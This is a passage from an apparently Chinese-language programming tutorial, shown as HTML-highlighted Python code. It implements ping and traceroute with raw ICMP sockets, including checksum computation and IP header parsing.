operator">:</span>    <span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">ICMP报文类型 <span class="token operator">=</span><span class="token operator">></span> 回送请求报文</span></span>    TYPE_ECHO_REQUEST <span class="token operator">=</span> <span class="token number">8</span>    CODE_ECHO_REQUEST_DEFAULT <span class="token operator">=</span> <span class="token number">0</span>    <span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">ICMP报文类型 <span class="token operator">=</span><span class="token operator">></span> 回送应答报文</span></span>    TYPE_ECHO_REPLY <span class="token operator">=</span> <span class="token number">0</span>    CODE_ECHO_REPLY_DEFAULT <span class="token operator">=</span> <span class="token number">0</span>    <span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">ICMP报文类型 <span class="token operator">=</span><span class="token operator">></span> 数据报超时报文</span></span>    TYPE_ICMP_OVERTIME <span class="token operator">=</span> <span class="token number">11</span>    CODE_TTL_OVERTIME <span class="token operator">=</span> <span class="token number">0</span>    <span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">ICMP报文类型 <span class="token operator">=</span><span class="token operator">></span> 目的站不可达报文</span></span>    TYPE_ICMP_UNREACHED <span class="token operator">=</span> <span class="token number">3</span>    CODE_NET_UNREACHED <span class="token operator">=</span> <span class="token number">0</span>    CODE_HOST_UNREACHED <span class="token operator">=</span> <span class="token number">1</span>    CODE_PORT_UNREACHED <span class="token operator">=</span> <span class="token number">3</span>    MAX_HOPS <span class="token operator">=</span> <span class="token number">30</span>  # 设置路由转发最大跳数为<span class="token number">30</span>    TIMEOUT <span class="token operator">=</span> <span class="token number">1</span>  # 如果一个请求超过<span class="token number">1</span>s未得到响应，则被认定为超时    TRIES <span class="token operator">=</span> <span class="token number">3</span>  # 对于每个中间站点，探测的次数设置为<span class="token number">1</span>    def <span class="token function">traceroute_raw_socket</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> dst_addr<span class="token punctuation">,</span> imcp_packet<span class="token punctuation">,</span> ttl<span class="token punctuation">)</span><span class="token operator">:</span>        #实例化一个socket对象，ipv4，原套接字，分配协议端口        rawsocket <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">socket</span><span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_RAW<span class="token punctuation">,</span>                                  socket<span class="token punctuation">.</span><span class="token function">getprotobyname</span><span class="token punctuation">(</span><span class="token string">"icmp"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        rawsocket<span class="token punctuation">.</span><span class="token function">setsockopt</span><span class="token punctuation">(</span>socket<span class="token punctuation">.</span>IPPROTO_IP<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>IP_TTL<span class="token punctuation">,</span> ttl<span class="token punctuation">)</span>        #记录当前请求时间        send_request_traceroute_time <span class="token operator">=</span> time<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        #发送数据到网络        rawsocket<span class="token punctuation">.</span><span class="token function">sendto</span><span class="token punctuation">(</span>imcp_packet<span class="token punctuation">,</span> <span class="token punctuation">(</span>dst_addr<span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        #返回数据        <span class="token keyword">return</span> send_request_traceroute_time<span class="token punctuation">,</span> rawsocket<span class="token punctuation">,</span> dst_addr    def <span class="token function">build_imcp_packet</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> host<span class="token punctuation">)</span><span class="token operator">:</span>        <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">icmp</span><span class="token expression">数据包的构建</span></span>        data_checksum <span class="token operator">=</span> <span class="token number">0</span>  # <span class="token string">"...with value 0 substituted for this field..."</span>        data_ID <span class="token operator">=</span> <span class="token number">0</span>  #Identifier        data_Sequence <span class="token operator">=</span> <span class="token number">1</span>  #Sequence number        payload_body <span class="token operator">=</span> b<span class="token char">'abcdefghijklmnopqrstuvwabcdefghi'</span>  #data        #  把字节打包成二进制数据        imcp_packet <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">pack</span><span class="token punctuation">(</span><span class="token char">'>BBHHH32s'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>TYPE_ECHO_REQUEST<span class="token punctuation">,</span>                                  self<span class="token punctuation">.</span>CODE_ECHO_REQUEST_DEFAULT<span class="token punctuation">,</span>                                  data_checksum<span class="token punctuation">,</span> data_ID<span class="token punctuation">,</span> data_Sequence<span class="token punctuation">,</span>                                  payload_body<span class="token punctuation">)</span>        icmp_chesksum <span class="token operator">=</span> self<span class="token punctuation">.</span><span class="token function">chesksum</span><span class="token punctuation">(</span>imcp_packet<span class="token punctuation">)</span>  #获取校验和        #  把校验和传入，再次打包        imcp_packet <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">pack</span><span class="token punctuation">(</span><span class="token char">'>BBHHH32s'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>TYPE_ECHO_REQUEST<span class="token punctuation">,</span>                                  self<span class="token punctuation">.</span>CODE_ECHO_REQUEST_DEFAULT<span class="token punctuation">,</span>                                  icmp_chesksum<span class="token punctuation">,</span> data_ID<span class="token punctuation">,</span> data_Sequence<span class="token punctuation">,</span>                                  payload_body<span class="token punctuation">)</span>        <span class="token keyword">return</span> imcp_packet    def <span class="token function">traceroute</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> host<span class="token punctuation">)</span><span class="token operator">:</span>        # 将主机名转ipv4地址格式，返回以ipv4地址格式的字符串，如果主机名称是ipv4地址，则它将保持不变        dst_addr <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">gethostbyname</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span>        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"\nrouting &#123;0&#125;[&#123;1&#125;](max hops = 30, detect tries = 3)\n"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>            host<span class="token punctuation">,</span> dst_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> ttl in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>MAX_HOPS<span class="token punctuation">)</span><span class="token operator">:</span>            <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>ttl<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>            flag <span class="token operator">=</span> False            <span class="token keyword">for</span> tries in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>TRIES<span class="token punctuation">)</span><span class="token operator">:</span>                imcp_packet <span class="token operator">=</span> self<span class="token punctuation">.</span><span class="token function">build_imcp_packet</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span>                send_request_traceroute_time<span class="token punctuation">,</span> rawsocket<span class="token punctuation">,</span> dst_addr <span class="token operator">=</span> self<span class="token punctuation">.</span><span class="token function">traceroute_raw_socket</span><span class="token punctuation">(</span>                    dst_addr<span class="token punctuation">,</span> imcp_packet<span class="token punctuation">,</span> ttl<span class="token punctuation">)</span>                ready <span class="token operator">=</span> select<span class="token punctuation">.</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">[</span>rawsocket<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>TIMEOUT<span class="token punctuation">)</span>                end_time <span class="token operator">=</span> time<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                during_time <span class="token operator">=</span> end_time <span class="token operator">-</span> send_request_traceroute_time                global ip_head<span class="token punctuation">,</span> receive_packet<span class="token punctuation">,</span> addr                <span class="token keyword">if</span> during_time <span class="token operator">>=</span> self<span class="token punctuation">.</span>TIMEOUT<span class="token operator">:</span>                    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"    *   "</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token operator">:</span>                    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"%4.0f ms "</span> <span class="token operator">%</span> <span class="token punctuation">(</span>during_time <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>                    flag <span class="token operator">=</span> True                    receive_packet<span class="token punctuation">,</span> addr <span class="token operator">=</span> rawsocket<span class="token punctuation">.</span><span class="token function">recvfrom</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>                    ip_head <span class="token operator">=</span> self<span class="token punctuation">.</span><span class="token function">parse_ip_header</span><span class="token punctuation">(</span>receive_packet<span class="token punctuation">[</span><span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>tries <span class="token operator">>=</span> self<span class="token punctuation">.</span>TRIES<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">:</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>flag <span class="token operator">==</span> False<span class="token punctuation">)</span><span class="token operator">:</span>                        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"request timeout"</span><span class="token punctuation">)</span>                        <span class="token keyword">break</span>                    icmp_head <span class="token operator">=</span> receive_packet<span class="token punctuation">[</span><span class="token number">20</span><span class="token operator">:</span><span class="token number">28</span><span class="token punctuation">]</span>                    type<span class="token punctuation">,</span> code<span class="token punctuation">,</span> checksum<span class="token punctuation">,</span> packet_id<span class="token punctuation">,</span> sequence <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span>                        <span class="token string">">BBHHH"</span><span class="token punctuation">,</span> icmp_head<span class="token punctuation">)</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">==</span> self<span class="token punctuation">.</span>TYPE_ICMP_UNREACHED <span class="token operator">and</span> flag <span class="token operator">==</span> False<span class="token punctuation">)</span><span class="token operator">:</span>                        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Wrong!unreached net/host/port!"</span><span class="token punctuation">)</span>                        <span class="token keyword">break</span>                    <span class="token function">elif</span> <span class="token punctuation">(</span>type <span class="token operator">==</span> self<span class="token punctuation">.</span>TYPE_ICMP_OVERTIME<span class="token punctuation">)</span><span class="token operator">:</span>                        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">" &#123;&#125;"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>ip_head<span class="token punctuation">[</span><span class="token char">'src_ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token function">elif</span> <span class="token punctuation">(</span>type <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">:</span>                        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">" &#123;&#125;"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>ip_head<span class="token punctuation">[</span><span class="token char">'src_ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"program run over!"</span><span class="token punctuation">)</span>                        <span class="token keyword">return</span>                    <span class="token keyword">else</span><span class="token operator">:</span>                        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">" &#123;&#125;"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>ip_head<span class="token punctuation">[</span><span class="token char">'src_ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h2 id="最终结果-1"><a href="#最终结果-1" class="headerlink" title="最终结果"></a>最终结果</h2><p><img src="Tracert.png" alt="TRACERT"><em>代码效果</em></p><h1 id="汇总代码"><a href="#汇总代码" class="headerlink" title="汇总代码"></a>汇总代码</h1><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">encoding</span><span class="token expression"><span class="token operator">:</span>utf<span class="token operator">-</span><span class="token number">8</span></span></span><span class="token keyword">import</span> <span class="token module">time</span><span class="token keyword">import</span> <span class="token keyword">struct</span><span class="token keyword">import</span> <span class="token module">socket</span><span class="token keyword">import</span> <span class="token module">select</span><span class="token keyword">import</span> <span class="token module">sys</span>from typing <span class="token keyword">import</span> <span class="token module">DefaultDict</span><span class="token keyword">class</span> <span class="token class-name">PING</span><span class="token operator">:</span>    IP_HEADER_LENGTH <span class="token operator">=</span> <span class="token number">20</span>    <span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">ICMP报文类型 <span class="token operator">=</span><span class="token operator">></span> 回送请求报文</span></span>    TYPE_ECHO_REQUEST <span class="token operator">=</span> <span class="token number">8</span>    CODE_ECHO_REQUEST_DEFAULT <span class="token operator">=</span> <span class="token number">0</span>    def <span class="token function">chesksum</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token operator">:</span>        n <span class="token operator">=</span> <span class="token function">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>        m <span class="token operator">=</span> n <span class="token operator">%</span> <span class="token number">2</span>        sum <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> n <span class="token operator">-</span> m<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">:</span>            sum <span class="token operator">+=</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>                <span class="token punctuation">(</span>data<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span>            <span class="token punctuation">)</span>  #传入data以每两个字节（十六进制）通过ord转十进制，第一字节在低位，第二个字节在高位        <span class="token keyword">if</span> m<span class="token operator">:</span>            sum <span class="token operator">+=</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        #将高于<span class="token number">16</span>位与低<span class="token number">16</span>位相加        sum <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>sum <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span>        sum <span class="token operator">+=</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span>  #如果还有高于<span class="token number">16</span>位，将继续与低<span class="token number">16</span>位相加        answer <span class="token operator">=</span> <span class="token operator">~</span>sum <span class="token operator">&amp;</span> <span class="token number">0xffff</span>        #  主机字节序转网络字节序列（参考小端序转大端序）        answer <span class="token operator">=</span> answer <span class="token operator">>></span> <span class="token number">8</span> <span class="token operator">|</span> <span class="token punctuation">(</span>answer <span class="token operator">&lt;&lt;</span> <span class="token number">8</span> <span class="token operator">&amp;</span> <span class="token number">0xff00</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> answer    def <span class="token function">request_ping</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data_type<span class="token punctuation">,</span> data_code<span class="token punctuation">,</span> data_checksum<span class="token punctuation">,</span> data_ID<span class="token punctuation">,</span>                     data_Sequence<span class="token punctuation">,</span> payload_body<span class="token punctuation">)</span><span class="token operator">:</span>        #  把字节打包成二进制数据        imcp_packet <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">pack</span><span class="token punctuation">(</span><span class="token char">'>BBHHH32s'</span><span class="token punctuation">,</span> data_type<span class="token punctuation">,</span> data_code<span class="token punctuation">,</span>                                  data_checksum<span class="token punctuation">,</span> data_ID<span class="token punctuation">,</span> data_Sequence<span class="token punctuation">,</span>                                  payload_body<span class="token punctuation">)</span>        icmp_chesksum <span class="token operator">=</span> self<span class="token punctuation">.</span><span class="token function">chesksum</span><span class="token punctuation">(</span>imcp_packet<span class="token punctuation">)</span>  #获取校验和        #  把校验和传入，再次打包        imcp_packet <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">pack</span><span class="token punctuation">(</span><span class="token char">'>BBHHH32s'</span><span class="token punctuation">,</span> data_type<span class="token punctuation">,</span> data_code<span class="token punctuation">,</span>                                  icmp_chesksum<span class="token punctuation">,</span> data_ID<span class="token punctuation">,</span> data_Sequence<span class="token punctuation">,</span>                                  payload_body<span class="token punctuation">)</span>        <span class="token keyword">return</span> imcp_packet    def <span class="token function">raw_socket</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> dst_addr<span class="token punctuation">,</span> imcp_packet<span class="token punctuation">)</span><span class="token operator">:</span>        <span class="token char">''</span>'        连接套接字<span class="token punctuation">,</span>并将数据发送到套接字        <span class="token char">''</span>'        #实例化一个socket对象，ipv4，原套接字，分配协议端口        rawsocket <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">socket</span><span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_RAW<span class="token punctuation">,</span>                                  socket<span class="token punctuation">.</span><span class="token function">getprotobyname</span><span class="token punctuation">(</span><span class="token string">"icmp"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        #记录当前请求时间        send_request_ping_time <span class="token operator">=</span> time<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        #发送数据到网络        rawsocket<span class="token punctuation">.</span><span class="token function">sendto</span><span class="token punctuation">(</span>imcp_packet<span class="token punctuation">,</span> <span class="token punctuation">(</span>dst_addr<span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        #返回数据        <span class="token keyword">return</span> send_request_ping_time<span class="token punctuation">,</span> rawsocket<span class="token punctuation">,</span> dst_addr    def <span class="token function">reply_ping</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>                   send_request_ping_time<span class="token punctuation">,</span>                   rawsocket<span class="token punctuation">,</span>                   data_Sequence<span class="token punctuation">,</span>                   timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">:</span>        <span class="token keyword">while</span> True<span class="token operator">:</span>            #开始时间            started_select <span class="token operator">=</span> time<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            #实例化select对象，可读rawsocket，可写为空，可执行为空，超时时间            what_ready <span class="token operator">=</span> select<span class="token punctuation">.</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">[</span>rawsocket<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> timeout<span class="token punctuation">)</span>            #等待时间            wait_for_time <span class="token operator">=</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> started_select<span class="token punctuation">)</span>            #没有返回可读的内容，判断超时            <span class="token keyword">if</span> what_ready<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">:</span>  # Timeout                <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>            #记录接收时间            time_received <span class="token operator">=</span> time<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            #设置接收的包的字节为<span class="token number">1024</span>            received_packet<span class="token punctuation">,</span> addr <span class="token operator">=</span> rawsocket<span class="token punctuation">.</span><span class="token function">recvfrom</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>            #获取接收包的icmp头            icmpHeader <span class="token operator">=</span> received_packet<span class="token punctuation">[</span><span class="token number">20</span><span class="token operator">:</span><span class="token number">28</span><span class="token punctuation">]</span>            #反转编码            type<span class="token punctuation">,</span> code<span class="token punctuation">,</span> checksum<span class="token punctuation">,</span> packet_id<span class="token punctuation">,</span> sequence <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span>                <span class="token string">">BBHHH"</span><span class="token punctuation">,</span> icmpHeader<span class="token punctuation">)</span>            ttl <span class="token operator">=</span> self<span class="token punctuation">.</span><span class="token function">parse_ip_header</span><span class="token punctuation">(</span>received_packet<span class="token punctuation">[</span><span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> type <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">and</span> sequence <span class="token operator">==</span> data_Sequence<span class="token operator">:</span>                <span class="token keyword">return</span> time_received <span class="token operator">-</span> send_request_ping_time<span class="token punctuation">,</span> ttl            #数据包的超时时间判断            timeout <span class="token operator">=</span> timeout <span class="token operator">-</span> wait_for_time            <span class="token keyword">if</span> timeout <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token operator">:</span>                <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> ttl    def <span class="token function">parse_ip_header</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> ip_header<span class="token punctuation">)</span><span class="token operator">:</span>        <span class="token string">""</span>"        IP报文格式        <span class="token number">1.</span> <span class="token number">4</span>位IP<span class="token operator">-</span>version <span class="token number">4</span>位IP头长度 <span class="token number">8</span>位服务类型 <span class="token number">16</span>位报文总长度        <span class="token number">2.</span> <span class="token number">16</span>位标识符 <span class="token number">3</span>位标记位 <span class="token number">13</span>位片偏移 暂时不关注此行        <span class="token number">3.</span> <span class="token number">8</span>位TTL <span class="token number">8</span>位协议 <span class="token number">16</span>位头部校验和        <span class="token number">4.</span> <span class="token number">32</span>位源IP地址        <span class="token number">5.</span> <span class="token number">32</span>位目的IP地址        <span class="token operator">:</span>param ip_header<span class="token operator">:</span>        <span class="token operator">:</span><span class="token keyword">return</span><span class="token operator">:</span>        <span class="token string">""</span>"        line1 <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token char">'>BBH'</span><span class="token punctuation">,</span> ip_header<span class="token punctuation">[</span><span class="token operator">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  # 先按照<span class="token number">8</span>位、<span class="token number">8</span>位、<span class="token number">16</span>位解析        ip_version <span class="token operator">=</span> line1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">4</span>  # 通过右移<span class="token number">4</span>位获取高四位        # 报文头部长度的单位是<span class="token number">32</span>位 即四个字节        iph_length <span class="token operator">=</span> <span class="token punctuation">(</span>line1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">4</span>  # 与<span class="token number">1111</span>与运算获取低四位        packet_length <span class="token operator">=</span> line1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>        line3 <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token char">'>BBH'</span><span class="token punctuation">,</span> ip_header<span class="token punctuation">[</span><span class="token number">8</span><span class="token operator">:</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        TTL <span class="token operator">=</span> line3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        protocol <span class="token operator">=</span> line3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        iph_checksum <span class="token operator">=</span> line3<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>        line4 <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token char">'>4s'</span><span class="token punctuation">,</span> ip_header<span class="token punctuation">[</span><span class="token number">12</span><span class="token operator">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        src_ip <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">inet_ntoa</span><span class="token punctuation">(</span>line4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        line5 <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token char">'>4s'</span><span class="token punctuation">,</span> ip_header<span class="token punctuation">[</span><span class="token number">16</span><span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        dst_ip <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">inet_ntoa</span><span class="token punctuation">(</span>line5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>            <span class="token char">'ip_version'</span><span class="token operator">:</span> ip_version<span class="token punctuation">,</span>            <span class="token char">'iph_length'</span><span class="token operator">:</span> iph_length<span class="token punctuation">,</span>            <span class="token char">'packet_length'</span><span class="token operator">:</span> packet_length<span class="token punctuation">,</span>            <span class="token char">'TTL'</span><span class="token operator">:</span> TTL<span class="token punctuation">,</span>            <span class="token char">'protocol'</span><span class="token operator">:</span> protocol<span class="token punctuation">,</span>            <span class="token char">'iph_checksum'</span><span class="token operator">:</span> iph_checksum<span class="token punctuation">,</span>            <span class="token char">'src_ip'</span><span class="token operator">:</span> src_ip<span class="token punctuation">,</span>            <span class="token char">'dst_ip'</span><span class="token operator">:</span> dst_ip        <span class="token punctuation">&#125;</span>    def <span class="token function">ping</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> host<span class="token punctuation">)</span><span class="token operator">:</span>        send<span class="token punctuation">,</span> accept<span class="token punctuation">,</span> lost <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>        sumtime<span class="token punctuation">,</span> shorttime<span class="token punctuation">,</span> longtime<span class="token punctuation">,</span> avgtime <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>        <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">icmp</span><span class="token expression">数据包的构建</span></span>        data_checksum <span class="token operator">=</span> <span class="token number">0</span>  # <span class="token string">"...with value 0 substituted for this field..."</span>        data_ID <span class="token operator">=</span> <span class="token number">0</span>  #Identifier        data_Sequence <span class="token operator">=</span> <span class="token number">1</span>  #Sequence number        payload_body <span class="token operator">=</span> b<span class="token char">'abcdefghijklmnopqrstuvwabcdefghi'</span>  #data        # 将主机名转ipv4地址格式，返回以ipv4地址格式的字符串，如果主机名称是ipv4地址，则它将保持不变        dst_addr <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">gethostbyname</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span>        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"\n正在 Ping &#123;0&#125; [&#123;1&#125;] 具有 32 字节的数据:"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> dst_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">:</span>            send <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>            #请求ping数据包的二进制转换            icmp_packet <span class="token operator">=</span> self<span class="token punctuation">.</span><span class="token function">request_ping</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>TYPE_ECHO_REQUEST<span class="token punctuation">,</span>                                            self<span class="token punctuation">.</span>CODE_ECHO_REQUEST_DEFAULT<span class="token punctuation">,</span>                                            data_checksum<span class="token punctuation">,</span> data_ID<span class="token punctuation">,</span>                                            data_Sequence <span class="token operator">+</span> i<span class="token punctuation">,</span> payload_body<span class="token punctuation">)</span>            #连接套接字<span class="token punctuation">,</span>并将数据发送到套接字            send_request_ping_time<span class="token punctuation">,</span> rawsocket<span class="token punctuation">,</span> addr <span class="token operator">=</span> self<span class="token punctuation">.</span><span class="token function">raw_socket</span><span class="token punctuation">(</span>                dst_addr<span class="token punctuation">,</span> icmp_packet<span class="token punctuation">)</span>            #数据包传输时间            times<span class="token punctuation">,</span> ttl <span class="token operator">=</span> self<span class="token punctuation">.</span><span class="token function">reply_ping</span><span class="token punctuation">(</span>send_request_ping_time<span class="token punctuation">,</span> rawsocket<span class="token punctuation">,</span>                                         data_Sequence <span class="token operator">+</span> i<span class="token punctuation">)</span>            <span class="token keyword">if</span> times <span class="token operator">></span> <span class="token 